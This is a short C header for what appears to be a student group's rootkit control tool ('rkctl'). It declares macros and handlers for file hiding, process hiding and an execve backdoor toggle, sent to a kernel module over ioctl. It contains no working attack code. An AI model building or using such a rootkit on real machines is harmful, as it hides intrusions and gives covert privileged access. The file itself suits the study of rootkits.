#ifndef _GROUP7_RKCTL_H
#define _GROUP7_RKCTL_H

#define ARGVCMP(i, x) (!strncmp(argv[i], (x), strlen(x)))
#define ASSERT_ARGC(x, msg) \
    do { \
        if (argc <= x) { \
            fprintf(stderr, "%s: %s\n", progname, msg); \
            exit(1); \
        } \
    } while (0)


typedef struct {
    int (*f)(void *);
    void * arg;
} cmd_t;

cmd_t parse_input(int, char **);
int issue_ioctl(unsigned long, const char *);
void help();

int handle_ping(void *);
int handle_filehide(void *);
int handle_backdoor_execve(void *);
int handle_backdoor_toggle(void *);
int handle_hidepid(void *);

#endif//_GROUP7_RKCTL_H
